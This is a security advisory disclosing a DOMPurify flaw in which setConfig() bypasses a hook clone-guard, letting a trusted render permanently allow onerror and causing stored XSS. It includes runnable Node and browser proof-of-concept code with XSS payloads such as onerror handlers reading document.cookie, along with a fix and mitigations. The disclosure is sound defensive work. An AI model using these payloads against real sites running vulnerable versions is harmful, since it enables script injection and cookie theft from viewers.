# [M] DOMPurify: Permanent `ALLOWED_ATTR` pollution via `setConfig()` bypassing the hook clone-guard (incomplete fix of the 3.4.7 hook-pollution patch)

## Summary
Severity: Medium
Advisory: GHSA-cmwh-pvxp-8882
CVE: CVE-2026-65898
CWE: CWE-471, CWE-665, CWE-79
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-cmwh-pvxp-8882
Type: github-advisory

## Affected
- npm: `dompurify` — affected >=0 <3.4.11

## Details
## Summary

DOMPurify 3.4.7 shipped a security fix ("permanent hook pollution") that makes a registered `uponSanitizeAttribute` hook's mutation of `data.allowedAttributes` **non-persistent** — so allowing an attribute for one element does not leak into later `sanitize()` calls. The fix clones `ALLOWED_ATTR` inside `_parseConfig`.

That guard is **silently bypassed whenever the application uses the persistent-config API `DOMPurify.setConfig()`.** `setConfig()` sets the module flag `SET_CONFIG = true`, which causes `sanitize()` to **skip `_parseConfig` entirely** — and the clone-guard lives inside `_parseConfig`. The hook is then handed the **live, shared `ALLOWED_ATTR` object**; any `data.allowedAttributes[name] = true` it writes mutates that shared object **permanently**, for the lifetime of the DOMPurify instance, across every subsequent call, and across **all** elements.

If an application uses `setConfig()` together with an `uponSanitizeAttribute` hook that conditionally allows a dangerous attribute (`onerror`, `onclick`, `onmouseover`, `srcdoc`, `formaction`, …) for "trusted" elements, then **one trusted render permanently allows that attribute on untrusted, attacker-controlled content** — yielding stored XSS in viewers' browsers. DOMPurify applies no separate `/^on/` event-handler blocklist: attribute stripping is governed entirely by the allowlist, so a polluted allowlist is the only gate, and survival in the output is final.

---

## Affected configuration (preconditions)

The vulnerability is triggered when an application does **both**:

1. Calls `DOMPurify.setConfig(...)` once (the recommended pattern for a fixed, persistent policy), **and**
2. Registers an `uponSanitizeAttribute` hook that writes `data.allowedAttributes[name] = true` to conditionally allow an attribute (e.g. only for elements bearing a trust marker).

This hook pattern is demonstrated in DOMPurify's own test suite, and the per-call variant of exactly this leak is what 3.4.7 was released to fix.

---

## Root cause (source: `src/purify.ts`, v3.4.10)

The 3.4.7 clone-guard — only inside `_parseConfig`:

```
// src/purify.ts  _parseConfig()  (lines ~950-968)
// "if a hook is registered AND the set still points at the default constant, clone it.
//  The hook then mutates the clone ... and the next default-cfg call rebinds to the untouched original."
if ( ... && hooks.uponSanitizeAttribute.length > 0) {
  ALLOWED_TAGS = clone(ALLOWED_TAGS);          // line 961
}
if ( ... hooks.uponSanitizeAttribute.length > 0 ... ) {
  ALLOWED_ATTR = clone(ALLOWED_ATTR);          // line 968
}
```

`sanitize()` skips `_parseConfig` on the persistent-config path:

```
// src/purify.ts  DOMPurify.sanitize()  (line 2369)
if (!SET_CONFIG) {
  _parseConfig(cfg);          // <-- clone-guard lives in here; SKIPPED when SET_CONFIG is true
}
```

`setConfig()` sets the flag that disables the guard:

```
// src/purify.ts  (lines 2596-2598)
DOMPurify.setConfig = function (cfg = {}) {
  _parseConfig(cfg);
  SET_CONFIG = true;          // every later sanitize() now skips _parseConfig
};
```

The hook is handed the **live** allowlist binding, and there is no secondary event-handler defense:

```
// src/purify.ts (line 2088) — hook event exposes the shared object by reference
allowedAttributes: ALLOWED_ATTR,
// (line 2108) hooks.uponSanitizeAttribute executed; a write to data.allowedAttributes mutates ALLOWED_ATTR itself
// _isValidAttribute gates purely on ALLOWED_ATTR[lcName]; DOMPurify uses NO /^on/ blocklist by design.
```

**Net:** after `setConfig()`, the clone-guard never runs, so the hook's `allowedAttributes` mutation is a permanent write to the instance's shared `ALLOWED_ATTR`.

---

## Proof of Concept

Environment: `npm i dompurify@3.4.10 jsdom` (Node; identical mechanism to `isomorphic-dompurify`, and to a browser instance).

### PoC 1 — the leak (trusted render permanently allows `onerror` on attacker content)

```js
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DP = createDOMPurify(new JSDOM('').window);

// App init: persistent policy + a hook that allows onerror ONLY for trusted, pre-vetted elements
DP.setConfig({ ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });
DP.addHook('uponSanitizeAttribute', (node, data) => {
  if (node.getAttribute && node.getAttribute('data-trusted') === '1') {
    data.allowedAttributes['onerror'] = true;        // intended: trusted-only
  }
});

// 1) A trusted widget is rendered once
DP.sanitize('<img data-trusted="1" src="x" onerror="loadWidget()">');

// 2) Later, ATTACKER-controlled content (NO data-trusted) is sanitized on the same instance
console.log(DP.sanitize('<img src="x" onerror="alert(document.cookie)">'));
// OUTPUT:  <img src="x" onerror="alert(document.cookie)">     <-- onerror SURVIVES -> XSS
```

### PoC 2 — it is a DOMPurify state-leak, not "the app allowed `on*`" (attribute-agnostic)

```js
// Same setConfig + hook shape, but the hook allows a BENIGN attribute (title).
// The leak is identical -> the defect is a shared-state mutation in DOMPurify,
// independent of which attribute the hook touches.
DP.setConfig({ ALLOWED_TAGS: ['span'], ALLOWED_ATTR: [] });
DP.addHook('uponSanitizeAttribute', (n, d) => {
  if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['title'] = true;
});
DP.sanitize('<span data-trusted="1" title="ok">x</span>');
console.log(DP.sanitize('<span title="leaked">x</span>'));   // -> <span title="leaked">x</span>  (leaked)
```

### PoC 3 — control: WITHOUT `setConfig()` the 3.4.7 guard holds

```js
const DP2 = createDOMPurify(new JSDOM('').window);
DP2.addHook('uponSanitizeAttribute', (n, d) => {
  if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['onerror'] = true;
});
DP2.sanitize('<img data-trusted="1" src="x" onerror="ok()">', { ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });
console.log(DP2.sanitize('<img src="x" onerror="alert(1)">', { ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] }));
// OUTPUT:  <img src="x">     <-- onerror correctly STRIPPED. setConfig() is the trigger.
```

### Persistence (observed)

- The leak **persists after `removeAllHooks()`** — removing the hook does not clean the polluted allowlist.
- It is **global / cross-element** — a polluted `onmouseover` survives on `<a>` and `<div>`, not only the originally-blessed `<img>`.
- It persists for the **instance lifetime** (survived 5/5 subsequent default calls).
- `clearConfig()` **does** restore a clean state (this is the bound of the impact).

---

## Impact

Stored XSS. In a long-lived (e.g. server-side / `isomorphic-dompurify`) DOMPurify instance, a single trusted render flips a shared allowlist bit; every subsequent untrusted submission then inherits a live event-handler attribute and executes script in viewers' browsers. Because DOMPurify enforces no `/^on/` blocklist, a surviving `on*` attribute is final — no secondary control prevents execution. `onerror` on a broken-`src` `<img>` fires with no user interaction (browser-confirmed; see Validation).

**Per-call `FORBID_ATTR` does not mitigate.** A defensive `sanitize(input, { FORBID_ATTR: ['onerror'] })` is also ignored once `setConfig()` has been called: the per-call config is parsed by `_parseConfig`, which `sanitize()` skips entirely under `SET_CONFIG`. So an application cannot blunt the leak with a per-call denylist — the poisoned `ALLOWED_ATTR` is the sole gate.

---

## Realistic attack scenario

A platform mixes admin-authored interactive widgets with user-generated content through one sanitizer instance:

1. The app installs a persistent baseline policy via `setConfig({ ALLOWED_TAGS: [...], ALLOWED_ATTR: [...] })`.
2. It registers an `uponSanitizeAttribute` hook that enables an event handler **only** for admin-vetted elements marked `data-trusted="1"`, intending safe rich interactivity — a pattern the 3.4.7 fix was specifically meant to make safe.
3. An admin renders one trusted widget. From that point on, every user-submitted comment/post containing `<img src=x onerror=...>` passes sanitization and executes for all viewers.

---

## Remediation

Extend the existing clone-guard to the persistent-config (`SET_CONFIG`) fast-path: when `sanitize()` skips `_parseConfig` but an `uponSanitizeAttribute` hook is registered, clone the allowlists before the walk so hook mutations cannot persist — the exact analogue of the guard already present in `_parseConfig`.

```js
// In DOMPurify.sanitize(), replacing the bare `if (!SET_CONFIG) { _parseConfig(cfg); }`:
if (!SET_CONFIG) {
  _parseConfig(cfg);
} else if (hooks.uponSanitizeAttribute.length > 0) {
  // Persistent-config path: _parseConfig (and its clone-guard) is skipped, so a hook would
  // otherwise mutate the shared ALLOWED_ATTR/ALLOWED_TAGS permanently. Clone per call.
  if (ALLOWED_ATTR === DEFAULT_ALLOWED_ATTR || ALLOWED_ATTR === currentSetConfigAttr) {
    ALLOWED_ATTR = clone(ALLOWED_ATTR);
  }
  if (ALLOWED_TAGS === DEFAULT_ALLOWED_TAGS || ALLOWED_TAGS === currentSetConfigTags) {
    ALLOWED_TAGS = clone(ALLOWED_TAGS);
  }
}
```

(Equivalently: in the hook-event builder at line ~2088, hand the hook a shallow clone of `ALLOWED_ATTR`/`ALLOWED_TAGS` whenever `SET_CONFIG` is true, mirroring the 3.4.7 intent.)

A regression test should reproduce PoC 1 and assert the attacker call returns `<img src="x">`. Note the existing 3.4.7 regression test ("unguarded attribute hook does not poison subsequent default-config calls") never exercises `setConfig()` — adding a `setConfig` variant closes the gap.

**Application-side mitigation until patched:** prefer `data.keepAttr = true` (per-element, non-persistent) over `data.allowedAttributes[name] = true` inside hooks; or call `DOMPurify.clearConfig()` between trust domains; or use separate DOMPurify instances for trusted vs. untrusted content.

---

## Limitations

- Requires the two-part precondition above (persistent `setConfig()` **and** a hook writing `data.allowedAttributes[...]`). Not a default-config bypass.
- Impact is bounded by `clearConfig()`, which restores a clean state. The earlier-considered "survives `clearConfig()`" claim did **not** reproduce and is withdrawn.
- A position could be adopted to "use `data.keepAttr=true`, not `allowedAttributes[]`." However, the 3.4.7 security fix exists precisely to defend the `allowedAttributes[]` hook pattern in the per-call path; leaving the `setConfig` path unguarded is an incomplete fix of an acknowledged security issue.

## Validation

- **Integrity:** the tested `dompurify@3.4.10` `dist/purify.cjs.js` (md5 `ab0e7b1cde1cbcace0f62b6aac284143`) and browser `dist/purify.min.js` (md5 `b0985f80fa48e6e7b263f8f6a64b779e`) are byte-identical to a freshly `npm pack`-ed release — the repro is on the real shipped code. Mechanism identical on 3.4.0, 3.4.9 and 3.4.10.
- **Node (mechanism):** PoCs 1–3 reproduce deterministically; `DOMPurify.isValidAttribute('img','onerror','x')` flips `false → true` after a single trusted render under `setConfig()`, proving the shared attribute gate is poisoned. Leak survives `removeAllHooks()`, is cross-element, persists for the instance lifetime, and is reset only by `clearConfig()`.
- **Real browser (impact):** in Chrome with DOMPurify 3.4.10, assigning the attacker output to `innerHTML` **executes** the surviving `onerror` (sentinel `window.__fired = ["ATTACKER-onerror"]`; `onerror` DOM property is a `function`), with no user interaction. The no-`setConfig` A/B control does not fire — execution is attributable to the `setConfig` leak, not a harness artifact.

---

## Appendix A — Node PoC (complete, runnable)

```js
// poc.js  —  npm i dompurify@3.4.10 jsdom  &&  node poc.js
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const freshDP = () => createDOMPurify(new JSDOM('').window);
const log = (s) => console.log(s);
log('DOMPurify ' + freshDP().version + '\n');

// PoC 1 — the leak: trusted render permanently allows onerror on attacker content
{
  const DP = freshDP();
  DP.setConfig({ ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });
  DP.addHook('uponSanitizeAttribute', (node, data) => {
    if (node.getAttribute && node.getAttribute('data-trusted') === '1') {
      data.allowedAttributes['onerror'] = true;            // intended: trusted-only
    }
  });
  DP.sanitize('<img data-trusted="1" src="x" onerror="loadWidget()">');            // trusted render
  const attacker = DP.sanitize('<img src="x" onerror="alert(document.cookie)">');  // attacker, no data-trusted
  log('[PoC1] attacker output  : ' + attacker);
  log('[PoC1] onerror survived : ' + /onerror/.test(attacker));
  log('[PoC1] isValidAttribute(img,onerror) -> ' + DP.isValidAttribute('img','onerror','x') + '  (shared gate poisoned)\n');
}

// PoC 2 — attribute-agnostic: a DOMPurify state-leak, not "the app allowed on*"
{
  const DP = freshDP();
  DP.setConfig({ ALLOWED_TAGS: ['span'], ALLOWED_ATTR: [] });
  DP.addHook('uponSanitizeAttribute', (n, d) => {
    if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['title'] = true;
  });
  DP.sanitize('<span data-trusted="1" title="ok">x</span>');
  log('[PoC2] benign title leaks: ' + DP.sanitize('<span title="leaked">x</span>') + '\n');
}

// PoC 3 — control: WITHOUT setConfig the 3.4.7 guard holds
{
  const DP = freshDP();
  DP.addHook('uponSanitizeAttribute', (n, d) => {
    if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['onerror'] = true;
  });
  DP.sanitize('<img data-trusted="1" src="x" onerror="ok()">', { ALLOWED_TAGS:['img'], ALLOWED_ATTR:['src'] });
  const ctrl = DP.sanitize('<img src="x" onerror="alert(1)">', { ALLOWED_TAGS:['img'], ALLOWED_ATTR:['src'] });
  log('[PoC3] control output   : ' + ctrl + '   stripped: ' + !/onerror/.test(ctrl) + '\n');
}

// Persistence: survives removeAllHooks(); reset only by clearConfig()
{
  const DP = freshDP();
  DP.setConfig({ ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });
  DP.addHook('uponSanitizeAttribute', (n, d) => {
    if (n.getAttribute && n.getAttribute('data-trusted') === '1') d.allowedAttributes['onerror'] = true;
  });
  DP.sanitize('<img data-trusted="1" src="x" onerror="ok()">');
  DP.removeAllHooks();
  let leaks = 0;
  for (let i = 0; i < 5; i++) if (/onerror/.test(DP.sanitize('<img src="x" onerror="alert('+i+')">'))) leaks++;
  log('[persist] survived ' + leaks + '/5 calls after removeAllHooks()');
  DP.clearConfig();
  log('[persist] after clearConfig(): ' + DP.sanitize('<img src="x" onerror="alert(1)">') + '  (reset)');
}
```

Expected output:
```
[PoC1] attacker output  : <img src="x" onerror="alert(document.cookie)">
[PoC1] onerror survived : true
[PoC1] isValidAttribute(img,onerror) -> true  (shared gate poisoned)
[PoC2] benign title leaks: <span title="leaked">x</span>
[PoC3] control output   : <img src="x">   stripped: true
[persist] survived 5/5 calls after removeAllHooks()
[persist] after clearConfig(): <img src="x">  (reset)
```

## Appendix B — Browser PoC (complete; confirms execution)

```html
<!doctype html><html><head><meta charset="utf-8">
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.4.10/dist/purify.min.js"></script>
</head><body><pre id="out"></pre>
<script>
const log = (s) => document.getElementById('out').textContent += s + '\n';
window.__fired = [];
window.alert = (x) => window.__fired.push('alert:' + x);   // sentinel: capture exec, no modal
log('DOMPurify ' + DOMPurify.version);

// App init: persistent policy + a hook allowing onerror ONLY for trusted elements
DOMPurify.setConfig({ ALLOWED_TAGS: ['img'], ALLOWED_ATTR: ['src'] });
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  if (node.getAttribute && node.getAttribute('data-trusted') === '1') data.allowedAttributes['onerror'] = true;
});

DOMPurify.sanitize('<img data-trusted="1" src="x" onerror="0">');                 // one trusted render
const out = DOMPurify.sanitize('<img src="x" onerror="alert(\'XSS:\'+document.domain)">');  // attacker
log('attacker sanitized output: ' + out);
const host = document.createElement('div');
host.innerHTML = out;                            // surviving onerror arms on the broken-src img
document.body.appendChild(host);

setTimeout(() => {
  log('handlers fired: ' + JSON.stringify(window.__fired));
  log(window.__fired.length ? 'RESULT: XSS EXECUTED' : 'RESULT: no execution');
}, 500);
</script></body></html>
```

Observed: `handlers fired: ["alert:XSS:<domain>"]` → **RESULT: XSS EXECUTED** (no user interaction). The same harness without the `setConfig()` line strips `onerror` and does not fire.

## References
- https://github.com/cure53/DOMPurify/security/advisories/GHSA-cmwh-pvxp-8882
- https://github.com/cure53/DOMPurify/pull/1482
- https://github.com/cure53/DOMPurify/commit/011bc3b2fcc4be17aa76f9030e8668207717acb9
- https://github.com/cure53/DOMPurify
- https://github.com/cure53/DOMPurify/releases/tag/3.4.11
